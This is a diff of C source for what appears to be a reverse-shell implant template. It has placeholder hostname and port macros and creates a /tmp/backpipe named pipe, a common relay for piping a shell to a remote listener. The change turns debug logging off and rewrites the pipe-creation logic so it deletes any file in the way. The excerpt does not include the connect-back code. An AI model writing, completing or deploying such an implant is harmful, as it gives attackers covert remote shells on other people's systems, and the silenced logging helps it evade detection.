@@ -23,7 +23,7 @@
 #define HOSTNAME "$hostname"
 #define PORT "$port"
 
-#define DEBUG 1
+#define DEBUG 0
 #define LOG(level, message, ...) do { if (DEBUG) syslog(level, message, ##__VA_ARGS__); } while(0)
 
 int main(int argc, const char * argv[]) {
@@ -58,23 +58,17 @@ int main(int argc, const char * argv[]) {
     openlog(argv[0], LOG_CONS | LOG_PID, LOG_DAEMON);
 #endif
     
-    while (1) {
-        if (mkfifo(filename, 0666) < 0) {
-            if (!(access(filename, F_OK))) {
-                struct stat bs;
-                stat(filename, &bs);
-                if ((bs.st_mode & S_IFMT) == S_IFIFO) {
-                    LOG(LOG_WARNING, "[i] backpipe fifo already exists...\n"); break;
-                } else {
-                    if (remove(filename) < 0)
-                        exit(1);
-                }
-            }
-            else
-                exit(1);
+createfifo:
+    if (mkfifo(filename, 0666) < 0) {
+        struct stat fs;
+        if (!(stat(filename, &fs)) && (fs.st_mode & S_IFMT) == S_IFIFO) {
+            LOG(LOG_WARNING, "[i] backpipe fifo already exists...\n");
         } else {
-            LOG(LOG_INFO, "[+] backpipe created.\n"); break;
+            assert(remove(filename) != -1);
+            goto createfifo;
         }
+    } else {
+        LOG(LOG_INFO, "[+] backpipe created.\n");
     }
     
     if ((bkp = open("/tmp/backpipe", O_RDWR | O_TRUNC)) < 0) {
